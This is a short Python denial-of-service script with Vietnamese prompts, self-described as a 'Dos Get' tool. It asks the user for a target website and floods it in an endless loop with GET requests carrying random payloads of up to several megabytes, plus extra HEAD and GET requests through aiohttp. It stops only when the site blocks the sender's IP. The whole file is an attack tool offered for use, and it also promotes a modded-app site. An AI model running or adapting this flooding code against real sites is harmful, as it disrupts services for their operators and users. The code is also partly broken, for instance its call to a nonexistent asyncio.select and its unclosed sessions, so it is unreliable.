import requests
import aiohttp
import asyncio
import random
import string
import ssl
import sys
import os
print("Dos Get - Tool siêu lỏ by Cánh Cụt Không Bay\n\npr: Kiếm app mod nào lên Gocmod.com nhé ÚwÙ\nHóng ai remake lại")
url = input("M muốn dos web nào: ")

def generate_random_payload():
    length = random.randint(1, 9999999)
    text_characters = string.ascii_letters + string.digits + string.punctuation
    payload = "".join(random.choice(text_characters) for i in range(length))
    return payload

async def attack(target):
    print("đợi check web")
    headers = {
        "X-Requested-With": "XMLHttpRequest",
        "Connection": "keep-alive",
        "Pragma": "no-cache",
        "Cache-Control": "no-cache",
        "Accept-Encoding": "gzip, deflate, br",
        "User-agent": "hello, world!!!",
    }

    while True:
        try:
            x = requests.get(target, headers=headers, params={"payload": generate_random_payload()}, timeout=3)
        except requests.exceptions.RequestException as e:
            print("Error:", e)

        if x is not None and x.status_code == 200:
            print("OK, bắt đầu dos...")
            session = aiohttp.ClientSession()
            context = ssl.create_default_context()
            async with session.head(target, cookies=x.cookies, ssl=context) as response:
                await response.text()
            test = requests.get(target)
            print("testing request:", test.status_code)
            await asyncio.sleep(0.1)
        elif x is not None and x.status_code == 403:
            print("Block IP !!!")
            break
        elif x is not None and x.status_code >= 500:
            print("False back!!!, attack phụ")
            session = aiohttp.ClientSession()
            async with session.get(target) as response:
                await response.text()
                await response.release()

        if sys.stdin in asyncio.select([sys.stdin], [], [], 0)[0]:
            break

asyncio.run(attack(url))
